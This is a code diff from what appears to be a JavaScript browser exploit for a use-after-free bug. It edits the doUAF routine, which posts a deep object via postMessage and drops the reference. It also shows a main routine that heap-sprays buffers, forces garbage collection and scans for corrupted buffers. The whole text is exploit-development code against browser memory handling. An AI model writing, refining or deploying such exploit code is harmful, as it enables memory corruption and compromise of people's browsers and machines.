@@ -41,14 +41,34 @@ function triggerUAF(depth) {
   return root;
 }
 
-async function doUAF(depth) {
+/*async function doUAF(depth) {
   const obj = triggerUAF(depth);
   let recv;
   const p = new Promise(r => addEventListener('message', e=>{recv=e.data; r();},{once:true}));
   postMessage(obj, location.origin);
   await p;
   return recv;
+}*/
+
+async function doUAF(depth) {
+   let obj = triggerUAF(depth);
+
+  
+  const p = new Promise(r => addEventListener(
+    'message',
+    e => { recv = e.data; r(); },
+    { once: true }
+  ));
+  postMessage(obj, location.origin);
+
+ 
+  obj = null;
+
+ 
+  await p;
+  return recv;
 }
+
 
 function findCorrupted(buffers) {
   for (let i=0;i<buffers.length;i++) {
@@ -70,7 +90,7 @@ async function main() {
  
   const pre = spray(SPRAY_COUNT, UAF_SIZE);
   const leaked = await doUAF(1600);
- root = null; 
+ 
   gc(); await sleep();
   const buffers = spray(SPRAY_COUNT, UAF_SIZE);
   const {buf, idx} = findCorrupted(buffers);
